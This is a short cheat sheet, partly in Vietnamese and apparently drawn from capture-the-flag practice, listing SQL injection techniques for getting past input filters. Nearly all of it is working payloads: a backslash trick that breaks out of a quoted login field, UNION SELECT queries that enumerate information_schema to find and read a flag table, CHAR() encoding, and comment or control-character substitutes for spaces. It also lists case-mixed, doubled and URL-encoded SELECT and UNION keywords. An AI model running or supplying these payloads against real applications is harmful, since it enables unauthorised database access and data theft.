# BYPASS 

## Bypass '
```sql
username: \
password: UNION SELECT table_name FROM information_schema.tables WHERE table_name like "%flag%"-- -
UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
UNION SELECT flag_3e53dc FROM flag_304ad593-- -

=> Dạng : "select username from users where username='\'and password=' UNION SELECT ....'  ";
```
Đoạn `\'and password=` sẽ đc coi là tên username vì \' đã vô hiệu hóa dấu '

```url
?amount=-1/*&name=*/ or 1=1-- -

amount=-1/*&name=*/%20UNION%20select%201,CONCAT(COLUMN_NAME),TABLE_NAME%20from%20INFORMATION_SCHEMA.COLUMNS%20where%20table_name=CHAR(102,108,97,103,116,97,98,108,101,97,104,105,104,105,104,111,104,111)--%20-
```
=> Dạng dùng comment lọc tham số đầu vào kết hợp 2 query 
=> Dùng char() => mã ascii bypass lọc `'` hoặc có thể dùng like mã hex hoặc binary
![image](https://user-images.githubusercontent.com/57553555/161938429-f7f8cf05-8805-4bd5-81ca-335c6f7d75bf.png)


## Bypass space 

```sql
/**/
-1/**/or/**/1=1-- -  (-1 or 1=1-- -)
%0d (CR)
%00 (null byte)
%0b ()
%0c

```

## Bypass select 
```sql
Select 
SeLeCt
SELECT 
SELSELECTECT
SEL/**/ECT
%00SELECT   
%53%45%4c%45%43%54                   #encode url 1l
%2553%2545%254c%2545%2543%2554       #encode url 2l

```

## Bypass union
```sql
uNion
UniOn
UNUNIONION
UNUNIONION%0dSELSELECTECT%0d

```

## Replaced Keywords
```sql
UNunionION SEselectLECT
uni%0bon se%0blect    # bypass keywords in Sql 

```


